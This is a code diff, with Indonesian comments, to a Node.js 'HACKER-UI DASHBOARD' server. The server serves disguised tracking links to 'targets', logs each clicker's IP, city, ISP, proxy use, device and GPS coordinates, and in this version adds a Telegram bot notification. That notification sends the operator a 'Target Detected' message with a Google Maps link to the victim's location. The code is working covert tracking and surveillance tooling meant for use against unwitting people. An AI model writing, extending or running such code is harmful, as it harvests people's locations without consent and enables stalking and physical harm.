@@ -1,4 +1,4 @@
-// File: server.js (v4.3 - Device Redirects & QR)
+// File: server.js (v4.4 - Telegram Notifications)
 
 require('dotenv').config();
 
@@ -50,6 +50,53 @@ const protectRoute = (req, res, next) => {
 };
 
 // ================== HELPER FUNCTIONS & SOCKET.IO ================== //
+
+// [START] FUNGSI BARU: Notifikasi Telegram
+const sendTelegramNotification = async (locationData) => {
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!botToken || !chatId) {
+        console.warn('⚠️ Variabel Telegram Bot (TOKEN/CHAT_ID) tidak diatur di .env, notifikasi dilewati.');
+        return;
+    }
+
+    const {
+        username, ip_address, city, country, isp, org, proxy,
+        browserInfo, osInfo, latitude, longitude
+    } = locationData;
+
+    // Format pesan menggunakan Markdown untuk tampilan yang lebih baik
+    const message = `
+*💀 Target Terdeteksi! 💀*
+
+*Target ID:* \`${username}\`
+*IP Address:* \`${ip_address}\`
+*Lokasi:* ${city || 'N/A'}, ${country || 'N/A'}
+*Provider:* ${isp || 'N/A'} (${org || 'N/A'})
+*Proxy/VPN:* ${proxy ? 'Ya' : 'Tidak'}
+
+*Perangkat:* ${browserInfo} pada ${osInfo}
+
+*Lihat di Peta:*
+[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})
+    `;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+        await axios.post(url, {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown' // Mengaktifkan format Markdown
+        });
+        console.log('✅ Notifikasi Telegram berhasil dikirim.');
+    } catch (error) {
+        console.error('❌ Gagal mengirim notifikasi Telegram:', error.response ? error.response.data : error.message);
+    }
+};
+// [END] FUNGSI BARU: Notifikasi Telegram
+
 const broadcastDashboardUpdate = async (socket = null) => {
     try {
         const [links] = await db.promise().query(`
@@ -148,7 +195,6 @@ app.get('/:id', async (req, res) => {
     const userAgentString = req.headers['user-agent'];
     
     try {
-        // Ambil semua URL dari database
         const [links] = await db.promise().query(`SELECT l.original_url, l.url_android, l.url_ios, l.expires_at, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
         
         if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
@@ -157,23 +203,20 @@ app.get('/:id', async (req, res) => {
         
         if (expires_at && new Date(expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
         
-        // Tentukan URL tujuan berdasarkan User-Agent
         const parser = new UAParser(userAgentString);
         const os = parser.getOS().name;
         
-        let destinationUrl = original_url; // Default URL
+        let destinationUrl = original_url;
         if (os === 'Android' && url_android) {
             destinationUrl = url_android;
         } else if (os === 'iOS' && url_ios) {
             destinationUrl = url_ios;
         }
 
-        // Tingkatkan jumlah klik
         await db.promise().query("UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", [id]);
         broadcastLogMessage(`> Link [${id}] clicked by target [${username}] from an ${os || 'Unknown'} device.`);
         io.emit('link_clicked', { username: username, id: id });
 
-        // Sajikan tracker.html dengan URL tujuan yang sudah ditentukan
         fs.readFile(path.join(__dirname, 'tracker.html'), 'utf8', (fsErr, data) => {
             if (fsErr) return res.status(500).send('Server error');
             res.send(data.replace('{{DESTINATION_URL}}', destinationUrl).replace('{{TRACKER_ID}}', id).replace('{{USERNAME}}', username));
@@ -191,6 +234,7 @@ app.post('/log', async (req, res) => {
     try {
         const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
         if (users.length === 0) return res.status(404).json({ status: 'error', message: 'User not found' });
+        
         let country = null, city = null, isp = null, org = null, proxy = false;
         try {
             const apiKey = process.env.OPENCAGE_API_KEY;
@@ -213,25 +257,34 @@ app.post('/log', async (req, res) => {
         } catch (apiError) {
             console.error("❌ Gagal memanggil API eksternal:", apiError.message);
         }
+        
         const newLocation = { user_id: users[0].id, tracker_id: trackerId, latitude, longitude, ip_address: ipAddress, user_agent: userAgentString, country, city, isp, org, proxy };
         await db.promise().query('INSERT INTO locations SET ?', newLocation);
+        
         const parser = new UAParser(userAgentString);
         const ua = parser.getResult();
         const browserInfo = ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown';
         const osInfo = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
         const locationInfo = city ? `from ${city}, ${country}` : '';
+        
         broadcastLogMessage(`> Location ${locationInfo} from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
         console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}] - ${city || 'Unknown City'}, ${country || 'Unknown Country'}`);
+
+        // [START] KODE BARU: Panggil fungsi notifikasi Telegram
+        const notificationData = { ...newLocation, username, browserInfo, osInfo };
+        await sendTelegramNotification(notificationData);
+        // [END] KODE BARU
+
         broadcastDashboardUpdate();
         const newLocationDataForMap = { ...newLocation, username };
         io.emit('new_location_logged', newLocationDataForMap);
+        
         res.json({ status: 'success' });
     } catch (error) {
         console.error("Error logging location:", error);
         res.status(500).json({ status: 'error' });
     }
 });
-
 
 // ================== API YANG DIPROTEKSI ================== //
 app.post('/create', protectRoute, async (req, res) => {
@@ -321,7 +374,7 @@ app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
 
 // ================== RUN SERVER ================== //
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v4.3 (Device Redirects & QR)`);
+    console.log(`\n HACKER-UI DASHBOARD v4.4 (Telegram Notifications)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
